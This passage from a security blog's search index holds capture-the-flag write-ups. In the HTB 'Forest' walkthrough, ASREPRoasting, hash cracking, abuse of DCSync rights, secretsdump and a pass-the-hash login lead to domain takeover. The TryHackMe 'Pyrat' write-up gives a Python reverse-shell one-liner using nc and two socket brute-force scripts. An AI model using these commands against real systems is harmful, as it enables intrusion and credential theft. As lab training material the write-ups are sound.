rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] We could have also used netexec for this purpose:\nnxc smb 10.129.30.97 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users We got back a few users:\nAdministrator krbtgt sebastien lucinda svc-alfresco andy mark santi Let\u0026rsquo;s note them somewhere and move on.\nASREPRoasting # Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let\u0026rsquo;s see if among our list of users account there are some that do not require kerberos pre-authentication:\nimpacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out Impacket v0.11.0 - Copyright 2023 Fortra [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...\u0026lt;SNIP\u0026gt;...63836d7 [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set As we can see, the service account svc-alfresco does not require kerberos pre-authentication, hence we making it vulnerable to ASREPRoasting.\nMore on ASREPRoasting -\u0026gt; https://www.thehacker.recipes/ad/movement/kerberos/asreproast\nWe can now try to crack it with hashcat:\nhashcat -m 18200 hash /usr/share/wordlists/rockyou.txt svc-alfresco password cracked ! Now that we have the password for svc-alfresco, let\u0026rsquo;s try to login via winrm:\nevil-winrm -i 10.129.30.97 -u svc-alfresco -p \u0026lt;PASSWORD\u0026gt; We successfully logged in and was able to retrieve the user flag at C:\\Users\\svc-alfresco\\Desktop\\user.txt\nUser flag obtained ! Privilege Escalation # Now that we have a foothold in the domain, let\u0026rsquo;s use bloodhound-python in order to collect information about the domain that we can than visualize after:\n# Collecting data bloodhoud-python -u svc-alfresco -p \u0026lt;PASSWORD\u0026gt; -ns 10.129.30.97 -d htb.local -c all # Zipping the json output files zip -r data.zip *.json Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that svc-alfresco, through nested group memberships, is in the Account Operators group which has GenericAll privilege on the Exchange Windows Permissions group which then have the WriteDacl privilege over the domain object.\nPath for privilege escalation With this information, we can do the following:\nCreate a new domain user. Add that user to the Exchange Windows Permissions group by abusing our GenericAll privilege. As the new user, add DCSync privileges to our self by abusing the WriteDacl privilege. Dump all the hashes # Creating a new domain user (as svc-alfresco) net user hackerr password123! /add /domain # Add \u0026#39;hackerr\u0026#39; to the Exchange Windows Permissions group net group \u0026#34;Exchange Windows Permissions\u0026#34; hackerr /add # Add DCSync privileges with $pass = ConvertTo-SecureString \u0026#39;password123!\u0026#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb.local\\hackerr\u0026#39;, $pass) Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync Now hackerr should have DCSync rights. We can verify by using using impacket\u0026rsquo;s secretsdump:\nimpacket-secretsdump htb.local/hackerr:\u0026#39;password123!\u0026#39;@10.129.30.97 -just-dc -outputfile dcsync.out DCSync We can use the Administrator\u0026rsquo;s NThash to login via winrm:\nevil-winrm -i 10.129.30.97 -u Administrator -H \u0026#39;32693b11e6aa90eb43d32c72a07ceea6\u0026#39; We can then retrive the root flag.\nRoot flag obtained ! ","date":"16 November 2024","externalUrl":null,"permalink":"/htb/forest/","section":"Htbs","summary":"","title":"HTB - Forest","type":"htb"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/tags/cache-deception/","section":"Tags","summary":"","title":"Cache Deception","type":"tags"},{"content":" Lab Info # Lab name Exploiting path mapping for web cache deception Level Apprentice Link https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: wiener:peter. Required Knowlegde\nTo solve this lab, you\u0026rsquo;ll need to know:\nHow regex endpoints map URL paths to resources. How to detect and exploit discrepancies in the way the cache and origin server map URL paths. These points are covered here -\u0026gt; Web cache deception\nSolving the lab # ","date":"11 November 2024","externalUrl":null,"permalink":"/portswigger/portswigger-exploiting-path-mapping-for-web-cache-deception/","section":"Portswiggers","summary":"","title":"Exploiting path mapping for web cache deception","type":"portswigger"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/tags/lab/","section":"Tags","summary":"","title":"Lab","type":"tags"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/tags/portswigger/","section":"Tags","summary":"","title":"Portswigger","type":"tags"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/series/portswigger-web-cache-deception/","section":"Series","summary":"","title":"Portswigger: Web Cache Deception","type":"series"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/portswigger/","section":"Portswiggers","summary":"","title":"Portswiggers","type":"portswigger"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/tags/wcd/","section":"Tags","summary":"","title":"Wcd","type":"tags"},{"content":"","date":"11 November 2024","externalUrl":null,"permalink":"/tags/web-cache/","section":"Tags","summary":"","title":"Web Cache","type":"tags"},{"content":"","date":"9 October 2024","externalUrl":null,"permalink":"/tags/custom-server/","section":"Tags","summary":"","title":"Custom Server","type":"tags"},{"content":"","date":"9 October 2024","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":" Pyrat is an “Easy” room where we encounter a rather “unusual” python HTTP server returning a curious response. With more testing, we realise that it is vulnerable to Python code execution which gives us foothold into the box. After some exploration, we find files that help us better understand how the Python server work and with some fuzzing with a custom script we finally get root access. Port Scanning # PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 8000/tcp open http-alt SimpleHTTP/0.6 Python/3.11.2 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=utf-8). |_http-open-proxy: Proxy might be redirecting requests We have 2 ports open:\n22 for ssh 8000 for a Python Http server Python HTTP Server # When we navigate to http://10.10.167.212:8000 we get the message: “Try a more basic connection!”\nHome Page Let’s try it with curl too:\ncurl http://10.10.167.212:8000 -i Using curl We can see in the response headers that the server is SimpleHTTP/0.6 Python/3.11.2 and the response body is the same as before: \u0026ldquo;Try a more basic connection.\u0026rdquo;\nSeeing this, what comes in mind is to try connecting via netcat as follows:\nnc 10.10.167.212 8000 With this command, we establish a connection with the server but we get nothing from it. Let’s try and see if we can run python code\nPython Code Execution We can see that the server executed our code. We can now try to get a reverse shell using the following one-liner payload:\nimport os; os.system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc \u0026lt;LHOST\u0026gt; \u0026lt;LPORT\u0026gt; \u0026gt;/tmp/f\u0026#34;) Don’t forget to replace \u0026lt;LHOST\u0026gt; and \u0026lt;LPORT\u0026gt; with the IP and Port of your listener. Reverse shell We got a shell back!\nPrivesc # www-data -\u0026gt; think # After some exploration, we stumble upon an interesting folder at /opt/dev. Listing the contents of this folder we see that it’s a git repository.\nWhen we try to execute basic git commands we get an error basically saying that this repo doesn’t belong to our user:\nDubious ownership of the repository We can see that the user think is the owner of this repo.\nWith further digging, we find a password inside /opt/dev/.git/config:\nthink\u0026rsquo;s password found in /opt/dev/.git/config If we try this password with ssh, we are able to login to the machine as think and get the user flag at /home/think/user.txt:\nUser flag obtained ! think -\u0026gt; root # Now that we have a shell as think, let’s see what was in that git repository.\nRunning git status We can see that there was a file named pyrat.py.old.\nAfter restoring it with git restore pyrat.py.old, we get the following python script:\n............................................... def switch_case(client_socket, data): if data == \u0026#39;some_endpoint\u0026#39;: get_this_enpoint(client_socket) else: # Check socket is admin and downgrade if is not aprooved uid = os.getuid() if (uid == 0): change_uid() if data == \u0026#39;shell\u0026#39;: shell(client_socket) else: exec_python(client_socket, data) def shell(client_socket): try: import pty os.dup2(client_socket.fileno(), 0) os.dup2(client_socket.fileno(), 1) os.dup2(client_socket.fileno(), 2) pty.spawn(\u0026#34;/bin/sh\u0026#34;) except Exception as e: send_data(client_socket, e ............................................... Reading the code, we see that the application will behave differently based on the data provided to it. Additionally, if we read the description of the room:\nA subsequent exploration yields valuable insights into the application’s older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint\nWe can infer that there is another endpoint ( like shell ) and we are supposed to fuzz the server in order to find it.\nBut before that, let’s see how the server behaves when it is provided a valid endpoint vs when it is given an invalid endpoint.\nFor the valid endpoint, let’s just try shell:\nTrying shell We can see that the shell endpoint works as shown in the python code (it spawns a shell). Now for an invalid endpoint (invalid123):\nTrying an invalid endpoint We get the message: “name ‘invalid123’ is not defined”.\nNow we have enough information to write a script that will help us discover new endpoints.\nimport socket # Defining variables RHOST = \u0026#34;10.10.137.243\u0026#34; RPORT = 8000 WORDLIST_PATH = \u0026#34;/usr/share/wordlists/dirb/common.txt\u0026#34; # Creating a socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Setting a timeout for the socket (2 seconds) s.settimeout(2) # Connecting to the server s.connect((RHOST, RPORT)) # Opening the wordlist file in \u0026#34;read\u0026#34; mode wlist = open(WORDLIST_PATH, \u0026#34;r\u0026#34;) for endpoint in wlist: print(f\u0026#34;[i] Trying {endpoint.strip()}\u0026#34;) try: s.sendall(endpoint.strip().encode()) response = s.recv(1024).decode() if \u0026#34;is not defined\u0026#34; not in response and \u0026#34;\u0026lt;string\u0026gt;\u0026#34; not in response and response.strip() != \u0026#34;\u0026#34;: print(f\u0026#34;[+] {endpoint.strip()} might be a valid endpoint. It returned: {response}\u0026#34;) choice = input(\u0026#34;Continue? [y/n] -\u0026gt; \u0026#34;) if choice != \u0026#34;y\u0026#34;: exit(0) except socket.timeout: print(f\u0026#34;[!] Timeout for {endpoint.strip()}\u0026#34;) continue wlist.close() This script will first connect to the server with help of the socket module. Once connected, it will loop through the wordlist (defined in the WORDLIST_PATH variable) and send each of the word to the server. If the response from the server fulfills the following criteria:\nDoes not contain \u0026ldquo;is not defined\u0026rdquo; : This is the response we got earlier for an invalid endpoint Does not contain \u0026ldquo;\u0026lt;string\u0026gt;\u0026rdquo; : For some words, the server will return and error usually containing \u0026ldquo;\u0026lt;string\u0026gt;\u0026rdquo; Is not empty It is considered a potential valid endpoint and the script prompt us if we want to continue or not.\nRunning the script After running the script, we eventually get the right endpoint. Let’s try it!\nTrying the valid endpoint We are prompted for a password…\nIf we go back to the room’s description:\nExploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.\nWe see that we are supposed to brute-force the password too. As we did previously, let’s see how the application behaves when given an invalid password.\nTrying invalid passwords We see that after 3 attempts, the server stops asking for the password and behaves like we just connected to it. So let’s try re-entering the valid endpoint:\nAfter re-entering the valid endpoint After re-entering the valid endpoint, we get prompted for the password again…\nSo our script has to send the valid endpoint, try 3 passwords, send the valid endpoint, try 3 passwords, so on and so forth.\nimport socket import time import os # Defining variables RHOST = \u0026#34;10.10.137.243\u0026#34; RPORT = 8000 WORDLIST_PATH = \u0026#34;/opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt\u0026#34; # Connecting to socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(3.0) s.connect((RHOST, RPORT)) # Opening the wordlist file wlist = open(WORDLIST_PATH, \u0026#34;r\u0026#34;) # Creating temporary wordlist temp_wlist = open(\u0026#34;/tmp/tmp_wlist\u0026#34;, \u0026#34;a\u0026#34;) for index, password in enumerate(wlist): if index % 3 == 0: temp_wlist.write(\u0026#34;\u0026lt;REDACTED\u0026gt;\\n\u0026#34;) temp_wlist.write(password) # Closing wordlist files wlist.close() temp_wlist.close() # Looping through temporary wordlist file temp_wlist = open(\u0026#34;/tmp/tmp_wlist\u0026#34;, \u0026#34;r\u0026#34;) for line in temp_wlist.readlines(): time.sleep(0.5) print(f\u0026#34;[i] Trying {line.strip()}\u0026#34;) try: s.sendall(line.strip().encode()) response = s.recv(1024).decode() if response != \u0026#34;Password:\\n\u0026#34;: print(f\u0026#34;[+] {line.strip()} might be the password. It returned: {response}\u0026#34;) choice = input(\u0026#34;Continue? [y/n] -\u0026gt; \u0026#34;) if choice != \u0026#34;y\u0026#34;: exit(0) except socket.timeout: print(\u0026#34;[-] Response timeout!\u0026#34;) continue # Closing temporary wordlist file temp_wlist.close() # Deleting temporary file os.system(\u0026#34;rm /tmp/tmp_wlist\u0026#34;) This script is similar to the first one, the difference being it will create a temporary wordlist from the provided wordlist in the WORDLIST_PATH variable. This temporary wordlist will contain the valid endpoint once every 4 words, for example:\nOriginal wordlist\npass1 pass2 pass3 pass4 pass5 Temporary wordlist\n\u0026lt;REDACTED\u0026gt; pass1 pass2 pass3 \u0026lt;REDACTED\u0026gt; pass4 pass5 Here \u0026lt;REDACTED\u0026gt; being the valid endpoint.\nIf we run the script:\nRunning the script Well, looks like we got it…\nRoot flag obtained ! We spawn a shell as root and get the root flag at /root/root.txt.\n","date":"9 October 2024","externalUrl":null,"permalink":"/thm/pyrat/","section":"Thms","summary":"","title":"THM - Pyrat","type":"thm"},{"content":"","date":"9 October 2024","externalUrl":null,"permalink":"/thm/","section":"Thms","summary":"","title":"Thms","type":"thm"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]